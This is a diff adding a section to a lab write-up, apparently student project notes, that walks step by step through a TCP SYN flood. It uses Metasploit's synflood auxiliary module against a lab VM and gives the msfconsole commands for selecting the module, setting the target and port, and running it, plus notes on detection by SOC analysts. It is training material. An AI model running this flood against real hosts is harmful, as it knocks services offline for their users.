@@ -448,3 +448,201 @@ SOC analysts always watch for TCP UDP and ICMP traffic using network monitoring 
 
 In this part I learned how UDP Flood attacks use up system resources with a lot of UDP traffic and how to do an ICMP Flood attack using **hping3** in a lab. 
 I also learned how Wireshark can help monitor and analyze ICMP traffic during an attack, which helps security professionals find network behavior.
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+# Project 11. Denial of Service Attacks
+
+# Part 4 – TCP SYN Flood Using Metasploit Framework
+
+## Objective
+
+I want to learn how to do a SYN Flood attack using the Metasploit Framework. This is a test in an environment. The Metasploit Framework can make a lot of SYN flood traffic to a target service. This is for security testing and learning.
+
+---
+
+# TCP SYN Flood Using Metasploit
+
+The Metasploit Framework has a tool that can make TCP SYN flood traffic to a target host. This tool is not like tools that try to exploit weaknesses. It is used to test if network services are working well by sending a lot of TCP SYN packets.
+
+I did this test in a lab environment with special virtual machines.
+
+---
+
+# Lab Setup
+
+| Machine | Role |
+
+
+| Kali Linux | Attacker |
+
+| Ubuntu 26.04 | Target |
+
+|Metasploit Framework | Attack Tool |
+
+| Wireshark | Traffic Monitoring |
+
+---
+
+# Launching Metasploit
+
+I start the Metasploit Framework.
+
+```bash
+
+sudo msfconsole -q
+
+```
+
+![Alt text](screenshots/metasploit-framework-startup.png)
+
+**Metasploit Framework Startup**
+
+```text
+
+metasploit-framework-startup.png
+
+```
+
+---
+
+# Loading the SYN Flood Module
+
+I search for the SYN flood tool. Load it.
+
+```text
+
+search synflood
+
+```
+
+```text
+
+use auxiliary/dos/tcp/synflood
+
+```
+
+I check the options I can change.
+
+```text
+
+show options
+
+```
+
+![Alt text](screenshots/metasploit-synflood-module.png)
+
+**Metasploit SYN Flood Module**
+
+```text
+
+metasploit-synflood-module.png
+
+```
+
+---
+
+# Configuring the Target
+
+I set up the target.
+
+```text
+
+set RHOSTS <Ubuntu_IP>
+
+```
+
+```text
+
+set RPORT 80
+
+```
+
+I check the setup.
+
+```text
+
+show options
+
+```
+
+---
+
+# Running the Module
+
+I start the SYN flood tool.
+
+```text
+
+run
+
+```
+
+or
+
+```text
+
+exploit
+
+```
+
+![Alt text](screenshots/metasploit-synflood-execution.png)
+
+**Metasploit SYN Flood Execution**
+
+```text
+
+metasploit-synflood-execution.png
+
+```
+
+---
+
+# Observation
+
+When I did the test:
+
+- The Metasploit Framework made TCP SYN packets to the target.
+
+- The target service got a lot of SYN requests.
+
+- I can use Wireshark and system monitoring tools to see the increased network activity.
+
+- This test shows how to do denial-of-service testing in a controlled environment.
+
+---
+
+# SOC Analyst Perspective
+
+SOC analysts watch for much SYN traffic because it can be a sign of a SYN Flood attack. They use network monitoring tools IDS/IPS solutions and SIEM platforms to find these patterns and respond quickly to incidents.
+
+---
+
+# Key Concepts Learned
+
+- Metasploit Framework
+
+- Auxiliary Modules
+
+- TCP SYN Flood
+
+- RHOSTS
+
+- RPORT
+
+- Denial of Service
+
+- Network Monitoring
+
+- SYN Packet Analysis
+
+---
+
+# conclusion
+
+In this part I learned how to use the Metasploit Framework to make TCP SYN Flood traffic in a safe environment. 
+I also learned how SOC analysts find SYN traffic and monitor denial-of-service activity using network analysis tools. 
+The Metasploit Framework is a tool, for TCP SYN Flood attacks.
